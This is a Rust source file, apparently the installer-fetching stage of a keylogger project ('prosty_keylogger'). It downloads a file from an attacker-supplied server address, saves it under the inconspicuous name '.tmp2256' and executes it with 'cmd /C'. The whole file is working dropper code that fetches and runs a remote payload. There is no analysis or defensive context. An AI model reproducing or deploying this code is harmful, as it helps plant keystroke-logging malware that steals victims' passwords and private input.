use std::fs;
use std::path::Path;
use clap::Parser;
use log::{info, LevelFilter};
use reqwest::Url;
use prosty_keylogger::common::setup_logger;
use crate::options::Options;

mod options;

async fn download_installer0(url: Url) -> Result<Vec<u8>, anyhow::Error>{
    let web_client = reqwest::Client::new();
    let b= web_client.get(url.join("/download_installer")?).send()
        .await?
        .bytes().await?;

    Ok(b.into())

}
fn download_installer(url: Url, dir: &Path, filename: &Path) -> Result<(), anyhow::Error>{
    let rt = tokio::runtime::Runtime::new()?;
    let content = rt.block_on(async {
        let c = download_installer0(url).await?;
        return Ok::<Vec<u8>, anyhow::Error>(c)
    })?;
    let path = dir.join(filename);
    println!("{:?}", &dir);
    let d = fs::create_dir_all(&dir)?;
    let mut file = std::fs::File::create(&path)?;
    std::fs::write(path, content)?;
    Ok(())
}
fn main() -> Result<(), anyhow::Error>{
    setup_logger(LevelFilter::Info)?;
    let p = Path::new(".tmp2256");

    let args = Options::parse();
    download_installer(Url::parse(&args.server_address)?, "./".into(), p)?;

    let output = std::process::Command::new("cmd")
        .args(["/C", p.into()])
        .output()?;
    info!("{:?}", output);


    Ok(())
}